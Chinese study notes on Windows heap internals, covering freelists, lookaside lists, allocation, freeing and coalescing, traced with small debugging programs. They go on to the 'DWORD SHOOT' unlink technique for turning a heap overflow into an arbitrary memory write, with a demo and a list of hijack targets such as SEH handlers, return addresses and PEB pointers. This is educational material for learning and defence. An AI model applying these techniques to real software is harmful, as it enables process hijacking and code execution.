# 堆溢出基础学习

## 堆和栈的区别

栈空间是在程序设计时已经规定好怎么使用，使用多少内存空间。栈空间由系统维护，来达到平衡。

```assembly
分配指令
sub esp,0x**;
回收指令
add esp,0x**;
```

堆具有以下特性

```
（1）堆是一种再程序运行时动态分配的内存，所谓动态是指所需内存的大小再程序设计时不能预先决定，需要再程序运行时参考用户的反馈。
（2）堆再使用时需要程序员用专用的函数进行申请，如C语言中的malloc等函数、C++中的new函数都是最常见的分配堆内存的函数。堆内存申请有可能成功，也有可能失败，这与申请内存空间的大小、机器性能和当前运行环境有关。
（3）一般用一个堆指针来使用申请得到的内存，读、写、释放都通过这个指针来完成。
（4）使用完毕后需要把堆指针传给堆释放函数回收这片内存，否则会造成内存泄露。典型的释放函数包括free、delete等
```

|          | 堆内存                                               | 栈内存                                                     |
| -------- | ---------------------------------------------------- | ---------------------------------------------------------- |
| 典型用例 | 动态增长的链表等数据结构                             | 函数局部数组                                               |
| 申请方式 | 需要用函数申请，通过返回的指针使用。如p = malloc(8); | 在程序中直接声明即可，如char buffer[8]                     |
| 释放方式 | 需要把指针传给专用的释放函数，如free                 | 函数返回时，由系统自动回收                                 |
| 管理方式 | 需要程序员处理申请与释放                             | 申请后直接使用，申请与释放由系统自动完成，最后达到栈区平衡 |
| 所处位置 | 变化范围很大                                         | 0x0012XXXX                                                 |
| 增长方向 | 由内存低地址向高地址排列（不考虑碎片等情况）         | 由内存高地址向低地址增加                                   |

## 堆的结构

![image-20220831153502190](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220831153502190.png)

**堆块**：出于性能的考虑，堆区的内存按不同大小组织成块，以堆块为单位进行标识，而不是传统的按字节标识。一个堆块包括两个部分: 块首和块身。块首是一个堆块头部的几个字节用来标识这个堆块自身的信息，例如，本块的大小、本块空闲还是占用等信息;块身是紧跟在块首后面的部分，也是最终分配给用户使用的数据区。

**堆表**:堆表一般位于堆区的起始位置，用于索引堆区中所有堆块的重要信息，包括堆块的位置、堆块的大小、空闲还是占用等。堆表的数据结构决定了整个堆区的组织方式，是快速检索空闲块、保证堆分配效率的关键。堆表在设计时可能会考虑采用平衡二叉树等高级数据结构用于优化查找效率。现代操作系统的堆表往往不止一种数据结构。

在Windows中，占用态的堆块被使用它的程序索引，而堆表只索引所有空闲态的堆块。其中，最重要的堆表有两种：空闲双向链表Freelist（以下简称空表）和快速单向链表Lookaside（以下简称快表）。

### 1、空表

​		空闲堆块的块首中包含一对重要的指针，这对指针用于将空闲堆块组织成双向链表。按照堆块的大小不同，空表总共被分为128条。

​		堆区一开始的堆表区中有一个128项的指针数组，被称做空表索引（Freelist array)。该数组的每一项包括两个指针，用于标识一条空表。

​		空表索引的第二项( free[1])标识了堆中所有大小为8字节的空闲堆块,之后每个索引项指示的空闲堆块递增8字节,例如, free[2]标识大小为16字节的空闲堆块, free[3]标识大小为24字节的空闲堆块，free[127]标识大小为1016字节的空闲堆块。因此有:

```
空闲堆块的大小=索引项(ID) x8(字节)
```

​		把空闲堆块按照大小的不同链入不同的空表，可以方便堆管理系统高效检索指定大小的空闲堆块。需要注意的是，空表索引的第一项(free[0])所标识的空表相对比较特殊。这条双向链表链入了所有大于等于1024字节的堆块(小于512KB)。这些堆块按照各自的大小在零号空表中升序地依次排列下去。

**空闲双向链表Freelist：**

![空闲双向链表Freelist](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220831152654393.png)

### 2、快表

​		快表是 Windows 用来加速堆块分配而采用的一种堆表。这里之所以把它叫做“快表”是因为这类单向链表中从来不会发生堆块合并(其中的空闲块块首被设置为占用态，用来防止堆块合并)。
​		快表也有128条，组织结构与空表类似，只是其中的堆块按照单链表组织。快表总是被初始化为空，而且每条快表最多只有4个结点，故很快就会被填满。

**快速单向链表Lookaside：**

![快速单向链表Lookaside](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220831152711333.png)

## 堆中的操作

​		堆中的操作可以分为堆块分配、堆块释放和堆块合并(Coalesce）三种。其中，“分配”和“释放”是在程序提交申请和执行的，而堆块合并则是由堆管理系统自动完成的。

### 1、堆块分配

​		堆块分配可以分为三类:快表分配、普通空表分配和零号空表（free[0]）分配。

​		从快表中分配堆块比较简单，包括寻找到大小匹配的空闲堆块、将其状态修改为占用态、把它从堆表中“卸下”、最后返回一个指向堆块块身的指针给程序使用。

​		普通空表分配时首先寻找最优的空闲块分配，若失败，则寻找次优的空闲块分配，即最小的能够满足要求的空闲块。

​		零号空表中按照大小升序链着大小不同的空闲块，故在分配时先从free[0]反向查找最后一个块（即表中最大块)，看能否满足要求，如果能满足要求，再正向搜索最小能够满足要求的空闲堆块进行分配（这就明白为什么零号空表要按照升序排列了)。

​		堆块分配中的“找零钱”现象:当空表中无法找到匹配的“最优”堆块时，一个稍大些的块会被用于分配。这种次优分配发生时，会先从大块中按请求的大小精确地“割”出一块进行分配，然后给剩下的部分重新标注块首，链入空表。这里体现的就是堆管理系统的“节约”原则:买东西的时候用最合适的钞票，如果没有，就要找零钱，决不会玩大方。

​		由于快表只有在精确匹配时才会分配，故不存在“找钱”现象。

```
注意:这里没有讨论堆缓存( heap cache)、低碎片堆(LFH）和虚分配。
```

### 2、堆块释放

​		释放堆块的操作包括将堆块状态改为空闲，链入相应的堆表。所有的释放块都链入堆表的末尾，分配的时候也先从堆表末尾拿。
​		另外需要强调，快表最多只有4项。

### 3．堆块合并

​		经过反复的申请与释放操作，堆区很可能变得“千疮百孔"，产生很多内存碎片。为了合理有效地利用内存，堆管理系统还要能够进行堆块合并操作。

​		当堆管理系统发现两个空闲堆块彼此相邻的时候，就会进行堆块合并操作。

​		堆块合并包括将两个块从空闲链表中“卸下”、合并堆块、调整合并后大块的块首信息（如大小等)、将新块重新链入空闲链表。

![image-20220901112924530](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220901112924530.png)

​		在具体进行堆块分配和释放时，根据操作内存大小的不同，Windows 采取的策略也会有所不同。可以把内存块按照大小分为三类:

```
小块：SIZE<1KB
大块：1KB<=SIZE<512KB
巨块：SIZE>=512KB
```

​		对应的分配和释放算法也有三类

|      | 分配                                                         | 释放                                                         |
| ---- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| 小块 | 首先进行快表分配；<br/>若快表分配失败，进行普通空表分配；<br/>若普通空表分配失败，使用堆缓存(heap cache)分配；<br/>若堆缓存分配失败，尝试零号空表分配(freelist[0])<br/>若零号空表分配失败，进行内存紧缩后再尝试分配；<br/>若仍无法分配，返回NULL | 优先链入快表（只能链入4个空闲块）；<br/>如果快表满，则将其链入相应的空表。 |
| 大块 | 首先使用堆缓存进行分配:<br/>若堆缓存分配失败。使用free[0]中的大块进行分配 | 优先将其放入堆缓存<br/>若堆缓存满，将链入freelists[0]        |
| 巨块 | 一般来说，巨块申请非常罕见，要用到虚分配方法（实际上并不是从堆区分配的）<br/>这种类型的堆块在堆溢出利用中几乎不会遇到， | 直接释放，没有堆表操作                                       |

```
（1）快表中的空闲块被设置为占用态，故不会发生堆块合并操作。
（2）快表只有精确匹配时才会分配，不存在“搜索次优解”和“找零钱”现象。
（3）快表是单链表，操作比双链表简单，插入删除都少用很多指令。
（4）综上所述，快表很“快”，故在分配和释放时总是优先使用快表，失败时才用空表。
（5）快表只有4项，很容易被填满，因此空表也是被频繁使用的。
```

## 堆分配函数之间的调用关系

Windows平台下的堆管理框架：

![image-20220901143203825](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220901143203825.png)

​		所有的堆分配函数最终都将使用位于ntdll.dll中的RtlAllocateHeap()函数进行分配，这个函数也是在用户态能够看到的最底层的堆分配函数。所谓万变不离其宗，这个“宗”就是RtlAllocateHeap()。研究Windows堆就需要研究这个函数。

Windows 堆分配 API 调用关系：

![image-20220901145111780](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220901145111780.png)

## 堆的调试方法

用于调试的代码

```c
#include <windows.h>
main()
{
	HLOCAL h1,h2,h3,h4,h5,h6;
	HANDLE hp;
	hp = HeapCreate(0,0x1000,0x10000);
	__asm int 3; // __asm("int $3");寄存器需要在前面加上%，例如__asm("push %ebp");
	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,3);
	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,5);
	h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,6);
	h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
	h5 = HeapAlloc(hp,HEAP_ZERO_MEMORY,19);
	h6 = HeapAlloc(hp,HEAP_ZERO_MEMORY,24);
	
	HeapFree(hp,0,h1);
	HeapFree(hp,0,h3);
	HeapFree(hp,0,h5);
	
	HeapFree(hp,0,h4);
	return 0;
}
```

​		调试堆与调试栈不同，不能直接用调试器Ollydbg、Windbg来加载程序，否则堆管理函数会检测到当前进程处于调试状态,而使用调试态堆管理策略。

​		调试态堆管理策略和常态堆管理策略有很大差异，集中体现在:

​				(1)调试堆不使用快表，只用空表分配。

​				(2)所有堆块都被加上了多余的16字节尾部用来防止溢出（防止程序溢出而不是堆溢出攻击)，这包括8个字节的0xAB和8个字节的0x00。

​				(3)块首的标志位不同。

​		调试态的堆和常态堆的区别就好像debug版本的PE和release版本的PE一样。如果您做堆溢出实验，发现在调试器中能够正常执行shellcode，但单独运行程序却发生错误，那很可能就是因为调试堆和常态堆之间的差异造成的。

进程的堆

### 识别堆表

​		程序将我们使用HeapCreate函数申请的堆的首地址存到了eax中，借此可以看到我们申请的堆的位置

![image-20220901174108191](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220901174108191.png)

![image-20220901174225906](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220901174225906.png)

**与堆溢出利用关系比较大的是空表索引区，位于0x178偏移处**![image-20220901180639621](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220901180639621.png)

### 堆块首部

​		空闲态堆块和占用态堆块的块首结构基本一致，只是将块首后数据区的前8个字节用于存放空表指针了，这8个字节在变回占用态时将重新分回块身用于存放数据。

占用态堆块的结构

![image-20220223194028903](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220223194028903.png)

空闲块堆块结构

![image-20220223194113447](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220223194113447.png)

再来看看我们动调的堆，我们去0x003A0688处看看尾块的状态

![image-20220905112255996](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220905112255996.png)

（1）实际上这个堆块开始于0x003A0680，一般引用堆块的指针都会跃过8字节的块首，直接指向数据区。

（2）尾块目前的大小为0x0130，计算单位是8个字节，也就是0x980字节

（3）堆块的大小是包含块首在内的,位于0x003A064（0x1000）

​		注意:我们的调试环境中，快表始终为空。按照堆表数据结构的规定，指向快表的指针位于偏移0x584字节处，空表索引区的位置是偏移0x178处，一共有128个双向链表，结尾地址也就是0x178 + 0x8 * 128 =0x578，中间距离一堆0，0x578处有一个数据，然后距离16字节的0之后，便是0x584字节处的快表指针。但是这个指针均为NULL。这是因为只有堆是可扩展的时候快表才会启用,要想启用快表我们在创建堆的时候就不能使用HeapCreate(0,0x1000,0x10000)来创建堆了，而要使用HeapCreate (0,0,0)创建一个可扩展的堆。

![image-20220905143541803](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220905143541803.png)

### 堆块的分配

（1）堆块的大小包括了块首在内，比如请求了32字节，实际会分配的堆块为40字节：8字节块首+32字节块身

（2）堆块的单位是8字节，不足8字节的部分按照8字节分配

（3）初始状态下，快表和空表都为空，不存在精确分配。请求将使用“次优块”进行分配。这个“次优块”就是偏移0x688处的尾块

（4）由于次优分配的发生，分配函数会陆续从尾块中切走一些小块，并修改尾块块首中的size信息，最后把freelist[0]指向新的尾块位置。

连续执行6次的内存申请

![image-20220905152811837](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220905152811837.png)

![image-20220905151120032](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220905151120032.png)

| 堆句柄 | 请求字节数 | 实际分配（堆单位/8字节） | 实际分配（字节） |
| ------ | ---------- | ------------------------ | ---------------- |
| H1     | 3          | 2                        | 16               |
| H2     | 5          | 2                        | 16               |
| H3     | 6          | 2                        | 16               |
| H4     | 8          | 2                        | 16               |
| H5     | 19         | 4                        | 32               |
| H6     | 24         | 4                        | 32               |

​		一共分配了2+2+2+2+4+4 = 0x10个单位堆块，剩下的空间为0x130 - 0x10 = 0x120个单位堆块大小

![image-20220905151506635](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220905151506635.png)

​		此时0x003A0178处的尾块偏移已经发送改变，变成了0x003A0708

![image-20220905152428167](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220905152428167.png)

### 堆块的释放

​		由于前三次释放的堆块在内存中不连续，因此不会发生合并。按照其大小，h1和 h3所指向的堆块应该被链入freelist[2]的空表,h5则被链入freelist[4]。

![image-20220905152904926](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220905152904926.png)

![image-20220905153348852](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220905153348852.png)

![image-20220905153334703](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220905153334703.png)

​		此时0x003A0188处的freelist[2]，原来指向自身，现在指向刚刚释放的2个空闲块h1和h3。

![image-20220905163637417](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220905163637417.png)

​		在0x003A0198处的freelist[4]，原来指向自身，现在指向刚刚释放的1个空闲块h5

![image-20220905163753234](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220905163753234.png)

### 堆块的合并

​		接着我们释放h4

![image-20220905154633411](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220905154633411.png)

![image-20220905154650092](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220905154650092.png)

![image-20220905154901706](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220905154901706.png)

​		这里h3，h4，h5都是空闲的且连续，则会进行堆块合并，这三个块从空表中摘下，合并后再插入空表，合并后的大小是2+2+4=8个块，链入free[8]，详细分析如下：

​		此时0x003A0188处的freelist[2]，原来标记的空表中有2个空闲块h1和h3，现在只剩下h1了，h3在合并的时候被摘下了。

![image-20220905164312366](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220905164312366.png)

​		在0x003A0198处的freelist[4]，原本标识的空表中有一个空闲块h5，现在被改成指向自身，因为h5在合并时被摘下了

![image-20220905164912119](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220905164912119.png)

​		在0x003A01B8处的freelist[8]，原来指向自身，现在则指向合并后的新空闲块0x003A06A8

![image-20220905165331547](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220905165331547.png)

​		这里合并的结果在内存上的体现是改变了原h3位置处的堆块大小，双向链表指针，对于其数据区的内容不进行改动，这就是堆块合并的过程。堆块合并可以更加有效地利用内存，但往往需要修改多处指针，也是一个费时的工作。因此，堆块合并只发生在空表中。在强调分配效率的快表中，堆块合并一般会被禁止（通过设置堆块为占用态)。另外，空表中的第一个块不会向前合并，最后一个块不会向后合并。

### 快表的使用

​		更改调试代码，将HeapCreate(0,0x1000,0x10000)改成HeapCreate (0,0,0)创建一个可扩展的堆。这里HeapCreate函数的参数不同，第三个参数是最大堆区大小，设置为0则表示这是动态大小，可用大小上限是内存大小，可能会很大，则会启动快表来帮助快速定位

```c++
#include <windows.h>
int main(int argc, char* argv[])
{
	HLOCAL h1,h2,h3,h4;
	HANDLE hp;
	hp = HeapCreate(0,0,0);
	__asm int 3;
	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
	h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16);
	h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,24);
	HeapFree(hp,0,h1);
	HeapFree(hp,0,h2);
	HeapFree(hp,0,h3);
	HeapFree(hp,0,h4);
	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16);
	HeapFree(hp,0,h2);
	return 0;
}
```

​		程序在使用快表之后堆结构也会发生一些变化，其中最为主要的变化是“尾块”不在位于堆0x0688偏移处了，这个位置被快表霸占。从偏移0x0178处的空表索引区也可以看出这一点。

![image-20220905170503827](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220905170503827.png)

​		去看看0x003A1E90的freelist[0]位置

![image-20220905171212039](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220905171212039.png)

​		现在我们去0x003A0688查看快表，可以看到堆刚初始化后快表是空的

![image-20220905170807533](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220905170807533.png)

​		接下来进行4次申请和4次释放操作，会将分割出来的块都填充到快表里。根据三个堆块的大小我们可以知道8字节的会被插入到Lookaside[1]中、16字节的会被插入到Lookaside[2]中、24字节的会被插入到Lokkaside[3]中。执行完四次释放操作后快表区状态所示。

![image-20220905173337877](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220905173337877.png)

​		接着我们去0x003A1EA0附近观察一下堆块的状态，可以看出快表中的堆块和空表中的堆块有着两个明显的区别

（1）块首中的标识位为0x01，也就是这个堆块是Busy 状态，这也是为什么快表中的堆块不进行合并操作的原因。
（2）块首只存指向下一堆块的指针，不存在指向前一堆块的指针。

![image-20220905180237705](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220905180237705.png)

​		经过前面的释放操作后，快表已经非空了，此时如果我们再申请8、16或24字节大小空间的时系统会从快表中给我们分配，所以程序中接下来申请16个字节空间时，系统会从Lookaside[2]中卸载一个堆块分配给程序，同时修改Lookaside[2]表头。

![image-20220905181110571](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220905181110571.png)

释放后

![image-20220905181158120](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220905181158120.png)

### new和malloc的区别

|         特征         |              new/delete               |             malloc/free              |
| :------------------: | :-----------------------------------: | :----------------------------------: |
|    分配内存的位置    |              自由存储区               |                  堆                  |
| 内存分配成功的返回值 |             完整类型指针              |                void*                 |
| 内存分配失败的返回值 |             默认抛出异常              |               返回NULL               |
|    分配内存的大小    |       由编译器根据类型计算得出        |          必须显式指定字节数          |
|       处理数组       |       有处理数组的new版本new[]        | 需要用户计算数组的大小后进行内存分配 |
|   已分配内存的扩充   |            无法直观地处理             |         使用realloc简单完成          |
|     是否相互调用     | 可以，看具体的operator new/delete实现 |             不可调用new              |
|  分配内存时内存不足  | 客户能够指定处理函数或重新制定分配器  |       无法通过用户代码进行处理       |
|       函数重载       |                 允许                  |                不允许                |
|  构造函数与析构函数  |                 调用                  |                不调用                |

# 堆溢出利用 DWORD SHOOT

## 链表“拆卸”问题

​		堆管理系统的三类操作:堆块分配、堆块释放和堆块合并归根结底都是对链表的修改。例如，分配就是将堆块从空表中“卸下"释放是把堆块“链入”空表;合并稍微复杂点，但也可以看成是把若干个堆块先从空表中“卸下"，修改块首信息(大小)之后把更新后的新块“链入”空表。

​		所有“卸下”和“链入”堆块的工作都发生在链表中，如果我们能伪造链表结点的指针，在“卸下”和“链入”的过程中就有可能获得一次读写内存的机会。

​		堆溢出利用的精髓就是用精心构造的数据去溢出下一个堆块的块首，改写块首中的前向指针（flink）和后向指针(blink)，然后在分配、释放、合并等操作发生时伺机获得一次向内存任意地址写入任意数据的机会。

​		我们把这种能够向内存任意位置写入任意数据的机会称为“DWORD SHOOT”（arbitrary DWORD reset）。注意:DWORD SHOOT发生时，我们不但可以控制射击的目标（任意地址)，还可以选用适当的子弹(4字节恶意数据)。

​	通过DWORD SHOOT，攻击者可以进而劫持进程，运行shellcode

| 点射目标（Target）   | 子弹（payload）   | 改写后的结果                  |
| -------------------- | ----------------- | ----------------------------- |
| 栈帧中的函数返回地址 | shellcode起始地址 | 函数返回时，跳去执行shellcode |
| 栈帧中的S.E.H句柄    | shellcode起始地址 | 异常发生时，跳去执行shellcode |
| 重要函数调用地址     | shellcode起始地址 | 函数调用时，跳去执行shellcode |

将一个节点冲双向链表中”卸下“的函数很可能是类似这样的。

```c
int  remove (ListNode *node) 
{
    node->blink->flink = node->flink; 
    node->flink->blink = node->blink;
    return 0;
}
```

![image-20220906101636210](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220906101636210.png)

​		当堆溢出发生时，非法数据可以淹没下一个堆块的块首。这时，块首是可以被攻击者控制的，即块首中存放的前向指针(flink）和后向指针（blink）是可以被攻击者伪造的。当这个堆块被从双向链表中“卸下”时，node -> blink -> flink = node -> flink将把伪造的flink 指针值写入伪造的blink所指的地址中去，从而发生DWORD SHOOT。

![image-20220906101728408](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220906101728408.png)

### 动态利用DWORD SHOOT

```c
#include "windows.h"
int main(int argc, char* argv[])
{
	HLOCAL h1, h2,h3,h4,h5,h6;
	HANDLE hp;
	hp = HeapCreate(0,0x1000,0x10000);
	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
	h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
	h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
	h5 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
	h6 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8);

	_asm int 3	//used to break the process
	//free the odd blocks to prevent coalesing
	HeapFree(hp,0,h1); 
	HeapFree(hp,0,h3); 
	HeapFree(hp,0,h5); //now freelist[2] got 3 entries
	
	//will allocate from freelist[2] which means unlink the last entry (h5)
	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); 
		
	return 0;
}
```

分配完h1-h6之后，0x003A0178 freelist[0]指向新块尾0x003A06E8

![image-20220906104246273](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220906104246273.png)

再看看0x3A0688附近堆块的具体情况，还有尾块的数值

![image-20220906105737809](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220906105737809.png)

接着我们释放h1、h3、h5，来看看0x003A0178处的数据，freelist[0]没有变化，0x003A0188处的freelist[2]，原来指向自身，现在指向刚刚释放的2个空闲块h1和h5。

![image-20220906110107375](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220906110107375.png)

再来看看0x003A0688附近的数据

![image-20220906110706821](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220906110706821.png)

|      | 起始位置   | Flag           | Size 单位： 8bytes | 前向指针flink               | 后向指针blink                |
| ---- | ---------- | -------------- | ------------------ | --------------------------- | ---------------------------- |
| h1   | 0x003A0680 | 空闲态0x00     | 0x0002             | 0x003A06A8                  | 0x003A0188                   |
| h2   | 0x003A0690 | 占用态0x01     | 0x0002             | 无                          | 无                           |
| h3   | 0x003A06A0 | 空闲态0x00     | 0x0002             | 0x003A06C8                  | 0x003A0688                   |
| h4   | 0x003A06B0 | 占用态0x01     | 0x0002             | 无                          | 无                           |
| h5   | 0x003A06C0 | 空闲态0x00     | 0x0002             | 0x003A0188                  | 0x003A06A8                   |
| h6   | 0x003A06D0 | 占用态0x01     | 0x0002             | 无                          | 无                           |
| 尾块 | 0x003A06E0 | 最后一项(0x10) | 0x0124             | 0x003A0178<br>(freelist[0]) | 0x003A0178<br/>(freelist[0]) |

![image-20220906141802919](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220906141802919.png)

这时，我们将h5空闲块处的前进指针改成0x44444444，后退指针改成0x00000000

![image-20220906142558135](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220906142558135.png)

继续下一个申请空间的代码运行，程序在访问edx中的数值并提取出来，准备赋值给ecx的时候出现异常，因为读取0x00000000地址的内容，当我们填入合法地址时，程序就会往0x44444444写入我们填入的合法地址中的值

![image-20220906143421531](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220906143421531.png)

再Windows2000上的测试

![image-20220907150811952](%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0.assets/image-20220907150811952.png)

### 代码植入

​		堆溢出的精髓是获得一个 DWORD SHOOT 的机会，所以，堆溢出利用的精髓也就是DWORD SHOOT的利用。
​		与栈溢出中的“地毯式轰炸”不同，堆溢出更加精准，往往直接狙击重要目标。精准是DWORD SHOOT的优点，但“火力不足”有时也会限制堆溢出的利用，这样就需要选择最重要的目标用来“狙击”。

​		接下来介绍一些内存中常用的“狙击目标"，然后以修改PEB中的同步函数指针为例,给出一个完整的利用堆溢出执行shellcode的例子。

​		DWORD SHOOT的常用目标（Windows XPSP1之前的平台）大概可以概括为以下几类。

（1）内存变量：修改能够影响程序执行的重要标志变量，往往可以改变程序流程。例如,更改身份验证函数的返回值就可以直接通过认证机制。在这种应用场景中，DWORD SHOOT要比栈溢出强大得多，因为栈溢出时溢出的数据必须连续，而DWORD SHOOT可以更改内存中任意地址的数据。

（2）代码逻辑：修改代码段重要函数的关键逻辑有时可以达到一定攻击效果，例如，程序分支处的判断逻辑，或者把身份验证函数的调用指令覆盖为0x90(nop)。这种方法有点类似于软件破解技术中的“爆破”——通过更改一个字节而改变整个程序的流程。

（3）函数返回地址：栈溢出通过修改函数返回地址能够劫持进程，堆溢出也一样可以利用DWORD SHOOT更改函数返回地址。但由于栈帧移位的原因，函数返回地址往往是不固定的,甚至在同一操作系统和补丁版本下连续运行两次栈状态都会有不同，故DWORD SHOOT在这种情况下有一定局限性,因为移动的靶子不好瞄准。

（4）攻击异常处理机制：当程序产生异常时，Windows 会转入异常处理机制。堆溢出很容易引起异常，因此异常处理机制所使用的重要数据结构往往会成为DWORD SHOOT的上等目标，这包括S.E.H (structure exception handler)、F.V.E.H (First Vectored Exception Handler)、进程环境块(PE.B）中的U.E.F(Unhandled Exception Filter)、线程环境块(T.E.B)中存放的第一个S.E.H指针(T.E.H)。

（5）函数指针：系统有时会使用一些函数指针，比如调用动态链接库中的函数、C++中的虚函数调用等。改写这些函数指针后，在函数调用发生后往往可以成功地劫持进程。但可惜的是，不是每一个漏洞都可以使用这项技术，这取决于软件的开发方式。

